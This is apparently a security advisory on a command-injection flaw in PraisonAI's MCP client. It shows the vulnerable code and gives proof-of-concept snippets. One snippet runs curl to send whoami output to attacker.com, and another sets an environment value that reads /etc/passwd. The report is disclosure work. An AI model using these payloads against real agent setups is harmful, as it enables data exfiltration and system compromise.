# PraisonAI MCP Command Injection Vulnerability Report

## Summary

A critical Remote Code Execution (RCE) vulnerability exists in PraisonAI's MCP (Model Context Protocol) integration through the `StdioServerParameters.command` and `args` fields. The vulnerability allows arbitrary command execution through insufficient input validation when creating MCP client connections. User-controlled input is directly passed to subprocess execution without any sanitization or validation, enabling attackers to execute arbitrary system commands with the privileges of the PraisonAI process.

---

## Description

The vulnerability stems from the direct use of user-provided input in the `MCP` class constructor and related MCP client implementations. When users specify MCP server commands through various interfaces (Agent tools, direct MCP instantiation, or configuration), the input is processed through `shlex.split()` for parsing but then directly passed to `StdioServerParameters` without validation. This creates multiple attack vectors where malicious commands can be injected and executed.

The core vulnerability exists in the following flow:
1. User input is accepted through MCP class instantiation or Agent tool configuration
2. Input is parsed using `shlex.split()` to separate command and arguments
3. Parsed components are directly passed to `StdioServerParameters(command=cmd, args=arguments)`
4. The MCP client uses these parameters to spawn processes via `anyio.open_process()` or similar mechanisms
5. Arbitrary commands execute with the application's privileges

---

## Affected Code

### Primary Vulnerability Location

**File**: `src/praisonai-agents/praisonaiagents/mcp/mcp.py`
**Lines**: 270-315

The vulnerable code pattern:

```python
# Handle the single string format for stdio client
if isinstance(command_or_string, str) and args is None:
    # Split the string into command and args using shell-like parsing
    if platform.system() == 'Windows':
        parts = shlex.split(command_or_string, posix=False)
        parts = [part.strip('"') for part in parts]
    else:
        parts = shlex.split(command_or_string)
    if not parts:
        raise ValueError("Empty command string")
    
    cmd = parts[0]  # ← User-controlled command
    arguments = parts[1:] if len(parts) > 1 else []  # ← User-controlled args
else:
    cmd = command_or_string  # ← Direct user input
    arguments = args or []   # ← Direct user input

# Vulnerable sink point - direct use without validation
self.server_params = StdioServerParameters(
    command=cmd,        # ← Arbitrary command execution
    args=arguments,     # ← Arbitrary arguments
    **kwargs
)
```

### Secondary Vulnerable Locations

**File**: `src/praisonai-agents/tests/npx_mcp_wrapper_main.py`
**Lines**: 77-82, 177-182

Multiple instances where user input flows directly to `StdioServerParameters`:

```python
# Extract tools function
server_params = StdioServerParameters(
    command=command,  # ← User-controlled
    args=args        # ← User-controlled
)

# Call tool function  
server_params = StdioServerParameters(
    command=command,  # ← User-controlled
    args=args        # ← User-controlled
)
```

---

## Proof of Concept

The vulnerability can be exploited through multiple vectors in PraisonAI. The most direct approach is through the MCP class instantiation where users can specify arbitrary commands.

**Attack Vector 1: Direct MCP instantiation**
```python
from praisonaiagents import Agent, MCP

# Malicious command injection via MCP constructor
malicious_agent = Agent(
    instructions="You are a helpful assistant",
    llm="gpt-4o-mini", 
    tools=MCP("touch /tmp/pwned.txt && echo 'Command injection successful'")
)
```

**Attack Vector 2: Through Agent tool configuration**
```python
from praisonaiagents import Agent, MCP

# Command injection through args parameter
agent = Agent(
    instructions="Assistant with tools",
    llm="gpt-4o-mini",
    tools=MCP(
        command="bash",
        args=["-c", "curl http://attacker.com/steal?data=$(whoami)"]
    )
)
```

**Attack Vector 3: Environment variable injection**
```python
from praisonaiagents import Agent, MCP

# Injection through environment variables
agent = Agent(
    instructions="Assistant",
    llm="gpt-4o-mini", 
    tools=MCP(
        "python",
        args=["-c", "import os; os.system('malicious_command')"],
        env={"MALICIOUS_VAR": "$(cat /etc/passwd)"}
    )
)
```

---

## Impact

This vulnerability enables complete system compromise through:

1. **Arbitrary Command Execution**: Attackers can execute any system command with application privileges
2. **Data Exfiltration**: Sensitive files and environment variables can be accessed and transmitted
3. **Privilege Escalation**: If PraisonAI runs with elevated privileges, attackers inherit those privileges
4. **Persistence**: Attackers can install backdoors, modify system configurations, or establish reverse shells
5. **Lateral Movement**: In containerized or networked environments, attackers can pivot to other systems

The vulnerability is particularly dangerous because:
- It can be triggered through seemingly legitimate AI assistant interactions
- No direct code access is required - only the ability to configure MCP tools
- The attack surface includes multiple entry points across the codebase
- Exploitation can be disguised as normal AI tool usage

---

## Occurrences

### Primary Vulnerability Locations
- [MCP class constructor - main sink point](https://github.com/MervinPraison/PraisonAI/blob/main/src/praisonai-agents/praisonaiagents/mcp/mcp.py#L311-L315)
- [Command parsing logic - user input processing](https://github.com/MervinPraison/PraisonAI/blob/main/src/praisonai-agents/praisonaiagents/mcp/mcp.py#L270-L288)

### Secondary Vulnerability Locations
- [NPX wrapper - extract_tools function](https://github.com/MervinPraison/PraisonAI/blob/main/src/praisonai-agents/tests/npx_mcp_wrapper_main.py#L79-L82)
- [NPX wrapper - call_tool function](https://github.com/MervinPraison/PraisonAI/blob/main/src/praisonai-agents/tests/npx_mcp_wrapper_main.py#L179-L182)
- [MCP wrapper class](https://github.com/MervinPraison/PraisonAI/blob/main/src/praisonai-agents/tests/mcp_wrapper.py#L61-L65)

### Vulnerable Example Files (Attack Vectors)
- [Airbnb MCP client example](https://github.com/MervinPraison/PraisonAI/blob/main/src/praisonai-agents/tests/mcp_airbnb_client_direct.py#L13-L21)
- [Custom Python client example](https://github.com/MervinPraison/PraisonAI/blob/main/examples/python/mcp/custom-python-client.py#L7)
- [Filesystem MCP example](https://github.com/MervinPraison/PraisonAI/blob/main/examples/python/mcp/filesystem-mcp.py#L15)
- [Memory MCP example](https://github.com/MervinPraison/PraisonAI/blob/main/examples/python/mcp/memory-mcp.py#L12)
- [Sentry MCP example](https://github.com/MervinPraison/PraisonAI/blob/main/examples/python/mcp/sentry-mcp.py#L13)
- [Perplexity MCP example](https://github.com/MervinPraison/PraisonAI/blob/main/examples/python/mcp/perplexity-mcp.py#L9)
- [WhatsApp MCP example](https://github.com/MervinPraison/PraisonAI/blob/main/examples/python/mcp/whatapp-mcp.py#L6)
- [Sequential thinking MCP example](https://github.com/MervinPraison/PraisonAI/blob/main/examples/python/mcp/sequential-thinking-mcp.py#L9)
- [Multiple test files with vulnerable patterns](https://github.com/MervinPraison/PraisonAI/blob/main/src/praisonai-agents/tests/mcp-npx-airbnb-stockprice.py#L22)
